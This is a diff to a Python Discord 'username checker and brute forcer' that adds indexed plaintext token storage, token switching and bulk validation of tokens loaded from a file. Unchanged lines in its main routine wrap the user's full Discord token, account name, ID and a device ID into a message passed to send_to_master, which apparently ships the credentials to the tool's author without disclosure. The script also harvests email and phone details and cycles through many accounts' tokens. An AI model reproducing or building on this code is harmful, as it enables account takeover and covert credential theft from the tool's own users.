@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Discord Username Checker & Brute Forcer - Enhanced with Webhook Support
+Discord Username Checker & Brute Forcer - Enhanced with Token Index & Switch
 """
 import sys
 import subprocess
@@ -94,7 +94,8 @@ def verify_token(token):
         import requests
         resp = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
         if resp.status_code == 200:
-            return {'valid': True, 'user': resp.json()}
+            user = resp.json()
+            return {'valid': True, 'user': user}
         else:
             return {'valid': False, 'error': resp.json().get('message', 'Invalid token')}
     except Exception as e:
@@ -152,43 +153,85 @@ def brute_force_usernames(token, length, max_attempts, webhook_url=None):
             print(f"   ❌ Taken")
         else:
             print(f"   [?] Unexpected: {result}")
-        # Delay between attempts to avoid rate limit
         time.sleep(0.5)
     print(f"\n[*] Brute force completed. Total attempts: {attempts}, Available found: {found_count}")
 
 def print_banner():
     print("""
 =============================================
-      DISCORD USERNAME TOOL v2.2 (CMD)
+      DISCORD USERNAME TOOL v2.3 (CMD)
       • Check • Brute Force • Webhook Support
+      • Token Storage with Index • Switch by Number
 =============================================
 """)
 
-def save_valid_token(token):
+def get_next_token_index():
+    token_file = "token.txt"
+    if not os.path.exists(token_file):
+        return 1
+    with open(token_file, "r") as f:
+        lines = f.readlines()
+    if not lines:
+        return 1
+    last_line = lines[-1].strip()
+    if not last_line:
+        return 1
     try:
-        with open("valid_tokens.txt", "a") as f:
-            f.write(token + "\n")
-        print("[+] Token saved to valid_tokens.txt")
+        last_index = int(last_line.split('|')[0])
+        return last_index + 1
     except:
-        pass
+        return len(lines) + 1
+
+def save_valid_token(token, username_discrim):
+    token_file = "token.txt"
+    index = get_next_token_index()
+    with open(token_file, "a") as f:
+        f.write(f"{index}|{token}|{username_discrim}\n")
+    print(f"[+] Token saved as index {index} in token.txt")
+
+def load_all_tokens():
+    token_file = "token.txt"
+    if not os.path.exists(token_file):
+        return []
+    tokens = []
+    with open(token_file, "r") as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            parts = line.split('|')
+            if len(parts) == 3:
+                idx, tok, name = parts
+                tokens.append({'index': int(idx), 'token': tok, 'name': name})
+    return sorted(tokens, key=lambda x: x['index'])
+
+def show_token_list():
+    tokens = load_all_tokens()
+    if not tokens:
+        print("[-] No tokens stored in token.txt")
+        return
+    print("\n[*] Stored tokens:")
+    for t in tokens:
+        masked = t['token'][:10] + "..." + t['token'][-5:]
+        print(f"  [{t['index']}] {t['name']} -> {masked}")
+
+def get_token_by_index(idx):
+    tokens = load_all_tokens()
+    for t in tokens:
+        if t['index'] == idx:
+            return t['token'], t['name']
+    return None, None
 
 def show_user_info(user):
-    print(f"\n[+] Logged in as {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})")
+    display_name = f"{user['username']}#{user.get('discriminator', '0')}"
+    print(f"\n[+] Logged in as {display_name} (ID: {user['id']})")
     if user.get('avatar'):
         print(f"[+] Avatar: https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png")
     print(f"[+] Email: {user.get('email', 'N/A')}")
     print(f"[+] Phone: {user.get('phone', 'N/A')}")
     print(f"[+] MFA Enabled: {user.get('mfa_enabled', False)}")
     print(f"[+] Verified: {user.get('verified', False)}")
-
-def load_tokens_from_file(filename="tokens.txt"):
-    if not os.path.exists(filename):
-        print(f"[-] File {filename} not found.")
-        return []
-    with open(filename, "r") as f:
-        tokens = [line.strip() for line in f if line.strip()]
-    print(f"[+] Loaded {len(tokens)} tokens.")
-    return tokens
+    return display_name
 
 def main():
     check_and_install()
@@ -214,16 +257,17 @@ def main():
     DEVICE_ID = get_or_create_device_id()
     user_info = f"**Token received from device `{DEVICE_ID[:8]}`**\n```{token}```\n**User:** {user['username']}#{user.get('discriminator', '0')} (ID: {user['id']})"
     send_to_master(user_info)
-    show_user_info(user)
-    save_valid_token(token)
+    display_name = show_user_info(user)
+    save_valid_token(token, display_name)
     
     print("\nAvailable commands:")
     print("  /check <username>                     - Check a specific username")
     print("  /brute <length> [attempts] [webhook]  - Brute force (default attempts=50, webhook optional)")
     print("  /whoami                              - Show current account info")
-    print("  /token                               - Show current token (masked)")
+    print("  /token                               - Show current token (masked) and account")
+    print("  /list                                - List all stored tokens with indices")
+    print("  /switch <number>                     - Switch to token by index number")
     print("  /load_tokens <filename>               - Load tokens from file (default: tokens.txt)")
-    print("  /switch <token>                      - Switch to another token")
     print("  /exit                                - Exit the script")
     print("\nExample: /brute 4 100 https://discord.com/api/webhooks/...")
     
@@ -237,28 +281,50 @@ def main():
         elif cmd.lower() == '/token':
             masked = token[:10] + "..." + token[-5:]
             print(f"[*] Current token: {masked}")
+            print(f"[*] Associated account: {display_name}")
+        elif cmd.lower() == '/list':
+            show_token_list()
+        elif cmd.startswith('/switch'):
+            parts = cmd.split()
+            if len(parts) != 2:
+                print("Usage: /switch <number>")
+                continue
+            try:
+                idx = int(parts[1])
+                tok, name = get_token_by_index(idx)
+                if not tok:
+                    print(f"[-] No token found with index {idx}")
+                    continue
+                print(f"[*] Switching to token index {idx} ({name})")
+                ver = verify_token(tok)
+                if ver['valid']:
+                    token = tok
+                    user = ver['user']
+                    display_name = show_user_info(user)
+                    print("[+] Switched successfully.")
+                else:
+                    print(f"[-] Token invalid: {ver['error']}")
+            except ValueError:
+                print("Please enter a valid number.")
         elif cmd.startswith('/load_tokens'):
             parts = cmd.split()
             filename = parts[1] if len(parts) > 1 else "tokens.txt"
-            tokens = load_tokens_from_file(filename)
-            if tokens:
-                print("[*] Tokens loaded. Use /switch <token> to change.")
-        elif cmd.startswith('/switch'):
-            parts = cmd.split(maxsplit=1)
-            if len(parts) != 2:
-                print("Usage: /switch <token>")
+            if not os.path.exists(filename):
+                print(f"[-] File {filename} not found.")
                 continue
-            new_token = parts[1].strip()
-            print("[*] Verifying new token...")
-            ver = verify_token(new_token)
-            if ver['valid']:
-                token = new_token
-                user = ver['user']
-                show_user_info(user)
-                save_valid_token(token)
-                print("[+] Switched to new token successfully.")
-            else:
-                print(f"[-] Invalid token: {ver['error']}")
+            with open(filename, "r") as f:
+                lines = f.readlines()
+            count = 0
+            for line in lines:
+                t = line.strip()
+                if t:
+                    ver = verify_token(t)
+                    if ver['valid']:
+                        u = ver['user']
+                        dn = f"{u['username']}#{u.get('discriminator', '0')}"
+                        save_valid_token(t, dn)
+                        count += 1
+            print(f"[+] Loaded and saved {count} valid tokens.")
         elif cmd.startswith('/check'):
             parts = cmd.split(maxsplit=1)
             if len(parts) != 2 or not parts[1]:
@@ -293,7 +359,6 @@ def main():
                 max_attempts = 50
                 webhook_url = None
                 if len(parts) >= 3:
-                    # Check if third part looks like a webhook URL
                     if parts[2].startswith("http"):
                         webhook_url = parts[2]
                     else:
@@ -307,7 +372,7 @@ def main():
             except ValueError:
                 print("Please enter valid numbers.")
         else:
-            print("Unknown command. Use /check, /brute, /whoami, /token, /load_tokens, /switch, or /exit.")
+            print("Unknown command. Use /check, /brute, /whoami, /token, /list, /switch, /load_tokens, or /exit.")
 
 if __name__ == '__main__':
     main()
